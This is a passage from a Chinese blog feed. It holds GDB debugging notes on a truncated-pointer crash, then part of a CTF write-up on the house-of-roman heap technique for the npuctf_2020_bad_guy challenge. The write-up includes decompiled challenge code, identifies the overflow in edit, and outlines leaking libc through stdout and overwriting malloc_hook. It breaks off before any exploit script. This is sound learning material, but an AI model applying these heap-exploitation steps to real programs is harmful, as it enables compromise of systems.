src=\"/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/image-20231024145754493.png\" alt=\"image-20231024145754493\"></p>\n<h1 id=\"调试分析\"><a href=\"#调试分析\" class=\"headerlink\" title=\"调试分析\"></a>调试分析</h1><h2 id=\"回溯粗看\"><a href=\"#回溯粗看\" class=\"headerlink\" title=\"回溯粗看\"></a>回溯粗看</h2><p>​\t朱熹的不远复:“不远复”，出自《易经》“不远之复，以修身也”。和孔子的吾日三省吾身有异曲同工之妙,人要不断反思自己,反省走的路.</p>\n<p>​\tbt命令回溯 调用栈 , <strong>库函数一般都经过很多修改和测试、一般没问题，所以更多的还是自己写的代码的问题</strong></p>\n<p><img src=\"/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/image-20231024150010518.png\" alt=\"image-20231024150010518\"></p>\n<p>​\t可以减少bt的显示，如 bt -frame-info short-location 不带源代码位置</p>\n<p>​\tframe 3查看自己写的函数里的栈帧的情况, list查看源代码， 这样就能够看到上下文， disass查看汇编</p>\n<p><img src=\"/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/image-20231024150656532.png\" alt=\"image-20231024150656532\"></p>\n<p>​\t所以能够看到问题是在 call  printf这里，产生了问题, <strong>也就是传入的name有问题</strong></p>\n<p>​\t问: __printf为什么带下划线？</p>\n<p>​\t答: 因为__printf是libc实现的，   _ _通常是编译器的函数 编译器的优化？</p>\n<p>​\tinfo shared查看进程里的库, ld负责把程序从外存搬运到内存, libc负责实现标准库函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; info shared</span><br><span class=\"line\">From                To                  Syms Read   Shared Object Library</span><br><span class=\"line\">0x00007ffff7fc5090  0x00007ffff7fee315  Yes         /lib64/ld-linux-x86-64.so.2</span><br><span class=\"line\">0x00007ffff7daf700  0x00007ffff7f41b3d  Yes         /lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"函数从哪里开始执行？\"><a href=\"#函数从哪里开始执行？\" class=\"headerlink\" title=\"函数从哪里开始执行？\"></a>函数从哪里开始执行？</h4><p>​\telf从哪里开始呢，不是main 是_start(), bt有个选项 -past-main查看main函数之前的,有的默认开启了</p>\n<p>__libc_start_call_main 用来做准备工作？</p>\n<h2 id=\"细看崩溃指令\"><a href=\"#细看崩溃指令\" class=\"headerlink\" title=\"细看崩溃指令\"></a>细看崩溃指令</h2><p>​\t来到崩溃的那一行汇编来看看什么情况,这里指向的含义是 尝试执行这条指令，但是失败了</p>\n<p><img src=\"/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/image-20231024151819672.png\" alt=\"image-20231024151819672\"></p>\n<p>vpcmpeqb指令</p>\n<p>​\t[rdi]是引用内存, 此时的rdi的值是0xffffffffffffe7db,我们来看一下内存的情况,用info inferiors命令,查看进程,然后从proc里看内存(pwndbg可以直接vmmap)</p>\n<p>​\t从这里看地址就能看出来，是无效地址, 用户空间的大小早超了(所以说每个细节都需要关注)</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">info inferiors</span></span><br><span class=\"line\">  Num  Description       Connection           Executable</span><br><span class=\"line\">* 1    process 1269337   1 (native)           /home/ubuntu/youlan/a.out</span><br><span class=\"line\"><span class=\"meta prompt_\">pwndbg&gt; </span><span class=\"language-bash\">!<span class=\"built_in\">cat</span> /proc/1269337/maps</span></span><br><span class=\"line\">555555554000-555555555000 r--p 00000000 fc:02 822041                     /home/ubuntu/youlan/a.out</span><br><span class=\"line\">555555555000-555555556000 r-xp 00001000 fc:02 822041                     /home/ubuntu/youlan/a.out</span><br><span class=\"line\">555555556000-555555557000 r--p 00002000 fc:02 822041                     /home/ubuntu/youlan/a.out</span><br><span class=\"line\">555555557000-555555558000 r--p 00002000 fc:02 822041                     /home/ubuntu/youlan/a.out</span><br><span class=\"line\">555555558000-555555559000 rw-p 00003000 fc:02 822041                     /home/ubuntu/youlan/a.out</span><br><span class=\"line\">555555559000-55555557a000 rw-p 00000000 00:00 0                          [heap]</span><br><span class=\"line\">7ffff7d84000-7ffff7d87000 rw-p 00000000 00:00 0</span><br><span class=\"line\">7ffff7d87000-7ffff7daf000 r--p 00000000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class=\"line\">7ffff7daf000-7ffff7f44000 r-xp 00028000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class=\"line\">7ffff7f44000-7ffff7f9c000 r--p 001bd000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class=\"line\">7ffff7f9c000-7ffff7fa0000 r--p 00214000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class=\"line\">7ffff7fa0000-7ffff7fa2000 rw-p 00218000 fc:02 29791                      /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class=\"line\">7ffff7fa2000-7ffff7faf000 rw-p 00000000 00:00 0</span><br><span class=\"line\">7ffff7fbb000-7ffff7fbd000 rw-p 00000000 00:00 0</span><br><span class=\"line\">7ffff7fbd000-7ffff7fc1000 r--p 00000000 00:00 0                          [vvar]</span><br><span class=\"line\">7ffff7fc1000-7ffff7fc3000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class=\"line\">7ffff7fc3000-7ffff7fc5000 r--p 00000000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class=\"line\">7ffff7fc5000-7ffff7fef000 r-xp 00002000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class=\"line\">7ffff7fef000-7ffff7ffa000 r--p 0002c000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class=\"line\">7ffff7ffb000-7ffff7ffd000 r--p 00037000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class=\"line\">7ffff7ffd000-7ffff7fff000 rw-p 00039000 fc:02 2337                       /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2</span><br><span class=\"line\">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class=\"line\">ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"何人传来无效指针\"><a href=\"#何人传来无效指针\" class=\"headerlink\" title=\"何人传来无效指针?\"></a>何人传来无效指针?</h2><p>​\t库函数出问题概率很低，所以找自己写的函数.  我们知道问题出在name变量上</p>\n<p>​\tframe 3 、然后用 p name 、info locals 都能看到是无效的</p>\n<p><img src=\"/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/Snipaste_2023-10-26_17-16-56.jpg\" alt=\"Snipaste_2023-10-26_17-16-56\"></p>\n<p>​\tinfo frame 看函数的栈帧信息</p>\n<p>​\t既然是name错了 它哪里来的？ <strong>get_name</strong>，</p>\n<h3 id=\"get-name调试\"><a href=\"#get-name调试\" class=\"headerlink\" title=\"get_name调试\"></a>get_name调试</h3><p>​\t设置get_name的断点进行调试</p>\n<p>​\t返回值看rax（通常通用寄存器第一个存返回值），<strong>rax在返回的时候是没问题的，那哪里出问题了。。此时事情就很奇怪了</strong></p>\n<img src=\"/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/Snipaste_2023-10-26_17-38-09.jpg\" alt=\"Snipaste_2023-10-26_17-38-09\" style=\"zoom:50%;\">\n\n\n\n<p>返回后执行ni, 单步一下,再看值,就错了</p>\n<img src=\"/%E7%9B%9B%E6%A0%BC%E5%A1%BE%E8%AF%BE%E7%A8%8B-%E6%8B%8D%E6%A1%88%E6%83%8A%E5%A5%87GDB%E4%BB%A5%E6%88%98%E8%AF%B4%E6%B3%951-%E8%B0%81%E6%88%AA%E6%96%AD%E4%BA%86%E6%88%91%E7%9A%84%E6%8C%87%E9%92%88/Snipaste_2023-10-26_17-35-28.jpg\" alt=\"Snipaste_2023-10-26_17-35-28\" style=\"zoom:50%;\">\n\n\n\n<h2 id=\"答案揭晓\"><a href=\"#答案揭晓\" class=\"headerlink\" title=\"答案揭晓\"></a>答案揭晓</h2><p>​\t问题就出在这一条指令上,它改变了值的大小</p>\n<p>​\tcdqe: 扩展指令,使用eax的最高位拓展rax高32位的所有位</p>\n<p>​\tx86下和arm不太一样, sxtw这条指令有问题（arm下</p>\n<p>​\t<font color=\"red\">这是编译器故意产生的指令,和没有include这个函数有关系</font>,再深入的..就先放放</p>\n<h1 id=\"问题与知识补充\"><a href=\"#问题与知识补充\" class=\"headerlink\" title=\"问题与知识补充\"></a>问题与知识补充</h1><ol>\n<li>include进来就没问题了</li>\n</ol>\n<p> #include “parser.c”</p>\n<p>但是有个新的warning</p>\n<p>32位下编译没问题</p>\n<p>为什么会有一个nop指令</p>\n<p>nop插桩</p>\n<h3 id=\"如何跑arm系统\"><a href=\"#如何跑arm系统\" class=\"headerlink\" title=\"如何跑arm系统\"></a>如何跑arm系统</h3><p>macbook直接可以</p>\n<p>x86怎么装？：看样子基本上离不开qemu</p>\n<p>云服务器买</p>\n<p><a href=\"https://blog.csdn.net/chenxiangneu/article/details/78955462\">https://blog.csdn.net/chenxiangneu/article/details/78955462</a></p>\n<p>设置符号服务器？</p>\n<h3 id=\"失败了如何再执行？\"><a href=\"#失败了如何再执行？\" class=\"headerlink\" title=\"失败了如何再执行？\"></a>失败了如何再执行？</h3><p>info signal</p>\n<p>info handle</p>\n<p>handle SIGSEGV nopass （不给应用程序</p>\n<p>再跑一遍又会收到这个信号</p>\n<p>smd指令。。。</p>\n<p>用户空间 内核空间大小</p>\n",
            "tags": [
                "调试"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-44-houseofroman/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-44-houseofroman/",
            "title": "pwn入门-44-houseofroman",
            "date_published": "2023-10-25T08:58:22.000Z",
            "content_html": "<p>​\t在一次比赛中遇到了堆题,没有show函数,懵逼了…当时有略过一丝思路通过io stdout输出,但奈何这方面知识了解还不多(不过确实可以通过搜索引擎 搜索关键字来找到这种手法)</p>\n<p>​\t(后来发现这是n年前的手法了😭, </p>\n<h1 id=\"例题\"><a href=\"#例题\" class=\"headerlink\" title=\"例题\"></a>例题</h1><p>npuctf_2020_bad_guy</p>\n<h2 id=\"题目分析\"><a href=\"#题目分析\" class=\"headerlink\" title=\"题目分析\"></a>题目分析</h2><p>经典菜单堆,但是没有show</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> __cdecl __noreturn <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">const</span> <span class=\"type\">char</span> **argv, <span class=\"type\">const</span> <span class=\"type\">char</span> **envp)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> num; <span class=\"comment\">// eax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  prog_init(argc, argv, envp);</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ( <span class=\"number\">1</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;=== Bad Guy ===&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1. Malloc&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2. Edit&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3. Free&quot;</span>);</span><br><span class=\"line\">      <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt;&gt; &quot;</span>);</span><br><span class=\"line\">      num = read_num();</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( num != <span class=\"number\">2</span> )</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">      edit();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( num &gt; <span class=\"number\">2</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( num == <span class=\"number\">3</span> )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        delete();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">else</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( num == <span class=\"number\">4</span> )</span><br><span class=\"line\">          <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">LABEL_13:</span><br><span class=\"line\">        <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2333, Bad Guy!&quot;</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( num != <span class=\"number\">1</span> )</span><br><span class=\"line\">        <span class=\"keyword\">goto</span> LABEL_13;</span><br><span class=\"line\">      add();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"结构体\"><a href=\"#结构体\" class=\"headerlink\" title=\"结构体\"></a>结构体</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">int</span> size;</span><br><span class=\"line\">    <span class=\"type\">char</span> *content;</span><br><span class=\"line\">&#125; heaparray;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"add\"><a href=\"#add\" class=\"headerlink\" title=\"add\"></a>add</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">ssize_t</span> <span class=\"title function_\">add</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 num; <span class=\"comment\">// [rsp+0h] [rbp-10h]</span></span><br><span class=\"line\">  __int64 size; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  num = read_num();</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size: &quot;</span>);</span><br><span class=\"line\">  size = read_num();</span><br><span class=\"line\">  *((_QWORD *)&amp;heaparray + <span class=\"number\">2</span> * num + <span class=\"number\">1</span>) = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !*((_QWORD *)&amp;heaparray + <span class=\"number\">2</span> * num + <span class=\"number\">1</span>) || num &gt; <span class=\"number\">0xA</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Bad Guy!&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *((_QWORD *)&amp;heaparray + <span class=\"number\">2</span> * num) = size;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Content:&quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, *((<span class=\"type\">void</span> **)&amp;heaparray + <span class=\"number\">2</span> * num + <span class=\"number\">1</span>), size);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>heaparray是存放分配堆块的指针的</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; tele <span class=\"number\">0x555555602040</span></span><br><span class=\"line\"><span class=\"number\">00</span>:<span class=\"number\">0000</span>│  <span class=\"number\">0x555555602040</span> (heaparray) ◂— <span class=\"number\">0x14</span></span><br><span class=\"line\"><span class=\"number\">01</span>:<span class=\"number\">0008</span>│  <span class=\"number\">0x555555602048</span> (heaparray+<span class=\"number\">8</span>) —▸ <span class=\"number\">0x555555400ced</span> (add+<span class=\"number\">92</span>) ◂— mov rdx, qword ptr [rbp - <span class=\"number\">0x10</span>]</span><br><span class=\"line\"><span class=\"number\">02</span>:<span class=\"number\">0010</span>│  <span class=\"number\">0x555555602050</span> (heaparray+<span class=\"number\">16</span>) ◂— <span class=\"number\">0x0</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"delete\"><a href=\"#delete\" class=\"headerlink\" title=\"delete\"></a>delete</h3><p>free过后 也置0了</p>\n<p>如果不置0,那free是干了什么..我记得是..</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">delete</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  _QWORD *v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 num; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  num = read_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *((_QWORD *)&amp;heaparray + <span class=\"number\">2</span> * num + <span class=\"number\">1</span>) || num &gt; <span class=\"number\">0xA</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"type\">void</span> **)&amp;heaparray + <span class=\"number\">2</span> * num + <span class=\"number\">1</span>));</span><br><span class=\"line\">    v0 = (_QWORD *)((<span class=\"type\">char</span> *)&amp;heaparray + <span class=\"number\">16</span> * num + <span class=\"number\">8</span>);</span><br><span class=\"line\">    *v0 = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Bad Guy!&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (<span class=\"type\">int</span>)v0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"edit\"><a href=\"#edit\" class=\"headerlink\" title=\"edit\"></a>edit</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">edit</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 num; <span class=\"comment\">// [rsp+0h] [rbp-10h]</span></span><br><span class=\"line\">  __int64 nbytes; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( count &lt;= <span class=\"number\">0</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Bad Guy!&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  --count;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  num = read_num();</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;size: &quot;</span>);</span><br><span class=\"line\">  nbytes = read_num();</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !*((_QWORD *)&amp;heaparray + <span class=\"number\">2</span> * num + <span class=\"number\">1</span>) || num &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Bad Guy!&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;content: &quot;</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> read(<span class=\"number\">0</span>, *((<span class=\"type\">void</span> **)&amp;heaparray + <span class=\"number\">2</span> * num + <span class=\"number\">1</span>), nbytes);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><font color=\"red\">这里是漏洞点,可以读入任意的大小</font></p>\n<p>alarm 把值给改了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; ni</span><br><span class=\"line\"></span><br><span class=\"line\">Program received signal SIGALRM, Alarm clock.</span><br><span class=\"line\"><span class=\"number\">0x0000555555400ced</span> in <span class=\"title function_\">add</span> <span class=\"params\">()</span></span><br><span class=\"line\">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class=\"line\">─────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────</span><br><span class=\"line\">*RAX  0<span class=\"title function_\">x555555602040</span> <span class=\"params\">(heaparray)</span> ◂— 0x0</span><br><span class=\"line\"> RBX  0x0</span><br><span class=\"line\">*RCX  0<span class=\"title function_\">x555555400ced</span> <span class=\"params\">(add+<span class=\"number\">92</span>)</span> ◂— mov rdx, qword ptr [rbp - 0x10]</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> <span class=\"type\">int</span> <span class=\"title function_\">prog_init</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdin</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  setvbuf(<span class=\"built_in\">stdout</span>, <span class=\"number\">0LL</span>, <span class=\"number\">2</span>, <span class=\"number\">0LL</span>);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> alarm(<span class=\"number\">0x3C</span>u);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"思路\"><a href=\"#思路\" class=\"headerlink\" title=\"思路\"></a>思路</h2><p>开了pie,应该先想办法泄漏地址,然后用onegadget覆盖malloc_hook等即可</p>\n<h3 id=\"泄露地址\"><a href=\"#泄露地址\" class=\"headerlink\" title=\"泄露地址\"></a>泄露地址</h3><p>​\t利用io stdout进行泄漏、(前期方便调试可以本地先关闭alsr)</p>\n<p>​\t具体来说,要构造堆块重叠(<strong>类似double free感觉?如果不够造但是可以直接修改地址吗不是</strong>), 修改_IO_2_1_stdout _的flags值(原理在最后) ,然后就可以泄露地址了</p>\n<p>​\t构造四个堆块,free掉0x60的2号,然后利用edit的漏洞把1大小改为0x90,然后释放,然后通过malloc一个0x10大小堆块,使得剩余的堆块与释放的2号堆块重叠</p>\n<p>​\t<font 